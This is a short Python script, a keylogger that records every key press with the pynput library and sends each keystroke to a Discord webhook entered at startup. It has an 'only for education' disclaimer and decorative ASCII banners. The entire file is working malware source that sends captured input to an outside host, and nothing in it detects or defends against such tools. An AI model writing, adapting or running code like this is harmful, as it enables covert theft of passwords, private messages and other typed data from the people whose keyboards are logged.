# ---------- Keylogger with Discord webhook ----------
#
# ----------------------- IMPORTANT -----------------------
# ---------- This programm is only for eduction! ----------
# ---------- Im not responsible for any damage! ----------
# ---------------------------------------------------------

# ---------- Import of all important modules for the project ----------

from pynput.keyboard import Key, Listener
from dhooks import Webhook
import logging
import colorama
from colorama import Fore, Back, Style
from colorama import init
from termcolor import colored
colorama.init(autoreset=True)

# ---------- Title of the project // Bar to beautify the UI ----------

print(f"""{Fore.BLUE}
██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
█████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║ █░█░█ █ ▀█▀ █░█   █▀▄ █ █▀ █▀▀ █▀█ █▀█ █▀▄   █░█░█ █▀▀ █▄▄ █░█ █▀█ █▀█ █▄▀
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝ ▀▄▀▄▀ █ ░█░ █▀█   █▄▀ █ ▄█ █▄▄ █▄█ █▀▄ █▄▀   ▀▄▀▄▀ ██▄ █▄█ █▀█ █▄█ █▄█ █░█

{Fore.GREEN}▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼
""")

# ---------- Input command so that you can enter the webhook URL // coloured ----------

hook = print(Fore.GREEN + "Enter webhook URL: ", end='')
Webhook1 = input()

# ---------- Spacers for a better overview ----------

print(" ")

# ---------- Note that the program runs successfully ----------

print(f"{Fore.GREEN}Keylogger started all input will be sent to your Discord webhook.")

# ---------- Spacers for a better overview ----------

print(" ")

# ---------- Bar to beautify the UI ----------

print(f"{Fore.GREEN}▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼")

# ---------- Redefining the variable ----------

log_send = Webhook(Webhook1)

# ---------- The main part in which the pressed key is recorded and sent to the webhook ---------

def on_press(key):
    logging.info(str(key))


    print(key)


    log_send.send(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
